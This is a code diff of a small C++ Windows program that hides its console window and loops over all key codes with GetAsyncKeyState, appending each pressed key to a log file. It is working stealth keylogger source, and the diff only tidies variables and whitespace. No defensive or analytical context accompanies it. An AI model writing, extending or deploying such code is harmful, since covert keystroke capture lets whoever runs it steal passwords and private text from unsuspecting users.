@@ -1,12 +1,12 @@
 #include <windows.h>
 #include <iostream>
 #include <fstream>
+#include <cstdlib>
 
 int main()
 {
     ShowWindow( GetConsoleWindow(), SW_HIDE );
 
-    int state;
     std::string enc_log;
     std::ofstream file;
 
@@ -26,16 +26,13 @@ int main()
 
         for (int i = 0; i < 255; i++)
         {
-            state = GetAsyncKeyState(i);
+            int state = GetAsyncKeyState(i);
 
             if (state == 1 || state == -32767)
             {
                 file.open(enc_log, std::ios::app);
-
                 file << i << ".";
-
                 file.flush();
-
                 file.close();
             }
         }
